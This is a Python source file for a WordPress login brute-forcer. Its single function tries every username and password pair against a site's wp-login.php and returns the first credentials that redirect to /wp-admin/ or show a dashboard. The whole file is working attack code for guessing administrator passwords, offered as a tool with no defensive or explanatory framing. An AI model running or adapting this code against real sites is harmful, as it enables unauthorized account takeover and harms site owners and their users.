import requests
from colorama import Fore

def brute_force_login(site, usernames, passwords, verbose=False):
    login_url = f"{site}/wp-login.php"

    for user in usernames:
        for pwd in passwords:
            if verbose:
                print(Fore.LIGHTBLACK_EX + f"[DEBUG] Trying {user}:{pwd}")
            data = {
                "log": user,
                "pwd": pwd,
                "wp-submit": "Log In",
                "redirect_to": f"{site}/wp-admin/",
                "testcookie": "1"
            }
            try:
                session = requests.Session()
                response = session.post(login_url, data=data, timeout=10, allow_redirects=False)

                if response.status_code in [302, 301] and "Location" in response.headers:
                    if "/wp-admin/" in response.headers["Location"]:
                        if verbose:
                            print(Fore.GREEN + f"[SUCCESS] Logged in as {user}:{pwd}")
                        return user, pwd

                elif "dashboard" in response.text.lower():
                    if verbose:
                        print(Fore.GREEN + f"[SUCCESS] Dashboard keyword match for {user}:{pwd}")
                    return user, pwd

            except Exception as e:
                if verbose:
                    print(Fore.RED + f"[!] Error trying {user}:{pwd} → {e}")
                continue

    return None, None
